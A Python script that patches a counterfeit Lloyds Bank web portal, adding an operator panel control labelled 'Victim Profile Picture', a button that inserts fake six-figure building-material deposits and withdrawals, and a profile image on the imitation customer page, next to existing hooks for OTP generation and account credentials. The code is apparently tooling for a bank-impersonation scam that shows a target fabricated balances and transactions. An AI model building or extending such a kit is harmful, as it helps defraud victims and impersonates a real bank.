import re
import os

ADMIN_FILE = r'C:\Users\xingk\Lloyds Banking Group\admin.html'
INDEX_FILE = r'C:\Users\xingk\Lloyds Banking Group\index.html'

with open(ADMIN_FILE, 'r', encoding='utf-8') as f:
    admin_html = f.read()

# 1. Add Profile Picture settings
profile_pic_html = """
                <!-- Profile Picture -->
                <div class="settings-group">
                    <p><i class="fas fa-image"></i> Victim Profile Picture</p>
                    <input type="text" id="adminProfilePic" placeholder="Image URL (e.g. https://...)">
                    <button id="btnUpdateProfilePic">Update Profile Picture</button>
                    <div id="profilePicStatus" class="status-msg"></div>
                </div>
"""
if 'Victim Profile Picture' not in admin_html:
    admin_html = admin_html.replace('<!-- Welcome Name Control -->', profile_pic_html + '\n                <!-- Welcome Name Control -->')

profile_pic_js = """
        // Update Profile Picture
        var btnUpdateProfilePic = document.getElementById('btnUpdateProfilePic');
        if (btnUpdateProfilePic) {
            btnUpdateProfilePic.addEventListener('click', async function() {
                var url = document.getElementById('adminProfilePic').value.trim();
                if (url) await setSyncItem('profilePic', url);
                document.getElementById('profilePicStatus').innerText = 'Profile picture updated!';
                setTimeout(function(){ document.getElementById('profilePicStatus').innerText = ''; }, 3000);
            });
        }
"""
if 'btnUpdateProfilePic.addEventListener' not in admin_html:
    admin_html = admin_html.replace('// Update Account Credentials', profile_pic_js + '\n        // Update Account Credentials')

profile_pic_poll_js = """
            // Poll Profile Picture
            var pPic = getSyncItem('profilePic');
            if (pPic && document.activeElement !== document.getElementById('adminProfilePic')) {
                var adminPicEl = document.getElementById('adminProfilePic');
                if(adminPicEl) adminPicEl.value = pPic;
            }
"""
if 'Poll Profile Picture' not in admin_html:
    admin_html = admin_html.replace('// Poll Account Credentials', profile_pic_poll_js + '\n            // Poll Account Credentials')


# Make transaction manager defaults
tx_manager_html = """
                <!-- Transaction Manager -->
                <div class="settings-group">
                    <p><i class="fas fa-list"></i> Add Transaction</p>
                    <input type="text" id="txDesc" placeholder="Description (e.g. STARK Building Materials UK)">
                    <input type="text" id="txDate" placeholder="Date (Editable, e.g. June 8, 2026)">
                    <input type="text" id="txAmount" placeholder="Amount (min £500,000)">
                    <select id="txType"><option value="deposit">Deposit</option><option value="withdrawal">Withdrawal</option></select>
                    <select id="txStatusSel"><option value="success">Success</option><option value="pending">Pending</option><option value="failed">Failed</option></select>
                    <button class="green" id="btnAddTx">Add Transaction</button>
                    <button class="red" id="btnClearTx" style="margin-top:6px;">Clear All Transactions</button>
                    <button class="blue" id="btnAddBuildingTx" style="margin-top:6px; background:#3498db; color:white; padding:8px 12px; border:none; border-radius:4px; font-weight:bold; cursor:pointer; width:100%; font-size:13px;">Add Default Building Material Transactions</button>
                </div>
"""
admin_html = admin_html.replace("""<!-- Transaction Manager -->
                <div class="settings-group">
                    <p><i class="fas fa-list"></i> Add Transaction</p>
                    <input type="text" id="txDesc" placeholder="Description (e.g. Direct Deposit)">
                    <input type="text" id="txDate" placeholder="Date (e.g. June 3, 2026)">
                    <input type="text" id="txAmount" placeholder="Amount (e.g. $40,000.00)">
                    <select id="txType"><option value="deposit">Deposit</option><option value="withdrawal">Withdrawal</option></select>
                    <select id="txStatusSel"><option value="success">Success</option><option value="pending">Pending</option><option value="failed">Failed</option></select>
                    <button class="green" id="btnAddTx">Add Transaction</button>
                    <button class="red" id="btnClearTx" style="margin-top:6px;">Clear All Transactions</button>
                </div>""", tx_manager_html)

add_building_tx_js = """
        var btnAddBuildingTx = document.getElementById('btnAddBuildingTx');
        if (btnAddBuildingTx) {
            btnAddBuildingTx.addEventListener('click', async function() {
                var txs = getSyncItem('transactions') || [];
                txs.push({ desc: 'Deposit - STARK Building Materials UK', date: 'June 7, 2026', amount: '£850,000.00', type: 'deposit', status: 'success' });
                txs.push({ desc: 'Withdrawal - Timber & Steel Supplies', date: 'June 5, 2026', amount: '£120,000.00', type: 'withdrawal', status: 'success' });
                txs.push({ desc: 'Deposit - BuildBase Construction', date: 'June 1, 2026', amount: '£550,000.00', type: 'deposit', status: 'success' });
                await setSyncItem('transactions', txs);
                alert('Building Material Transactions Added!');
            });
        }
"""
if 'btnAddBuildingTx' not in admin_html:
    admin_html = admin_html.replace('// Generate OTP', add_building_tx_js + '\n        // Generate OTP')


with open(ADMIN_FILE, 'w', encoding='utf-8') as f:
    f.write(admin_html)

# Index html
with open(INDEX_FILE, 'r', encoding='utf-8') as f:
    index_html = f.read()

# Replace broken logo links
new_logo = "./favicon.png"
index_html = index_html.replace('https://www.lloydsbank.com/assets/media/logo/lloyds-bank-logo.svg', new_logo)
index_html = index_html.replace('https://www.lloydsbankinggroup.com/favicon.ico', new_logo)
index_html = index_html.replace('https://www.lloydsbank.com/favicon.ico', new_logo)

# Fix other broken images if they are known (just in case)
index_html = index_html.replace('https://images.unsplash.com/photo-1573164713988-8665fc963095?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80', 'https://images.unsplash.com/photo-1573164713988-8665fc963095?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80')

# Add Profile picture to welcome section
welcome_html = '<h2 style="color:#a8151b; margin-bottom:20px; font-size:28px;">Welcome back, <span id="welcomeName">Kyung</span></h2>'
welcome_with_pic = """
                <div style="display:flex; align-items:center; gap:20px; margin-bottom:20px;">
                    <img id="userProfilePic" src="https://via.placeholder.com/80?text=User" alt="Profile" style="width:80px; height:80px; border-radius:50%; object-fit:cover; border:2px solid #006a4d; display:none;">
                    <h2 style="color:#a8151b; margin-bottom:0; font-size:28px;">Welcome back, <span id="welcomeName">Kyung</span></h2>
                </div>
"""
if 'userProfilePic' not in index_html:
    index_html = index_html.replace(welcome_html, welcome_with_pic)

poll_pic_index = """
            // Poll Profile Pic
            if (globalState.profilePic) {
                var picEl = document.getElementById('userProfilePic');
                if (picEl) {
                    picEl.src = globalState.profilePic;
                    picEl.style.display = 'block';
                }
            }
"""
if 'Poll Profile Pic' not in index_html:
    index_html = index_html.replace('// Poll Account Credentials', poll_pic_index + '\n            // Poll Account Credentials')


with open(INDEX_FILE, 'w', encoding='utf-8') as f:
    f.write(index_html)

print("Modifications applied successfully.")
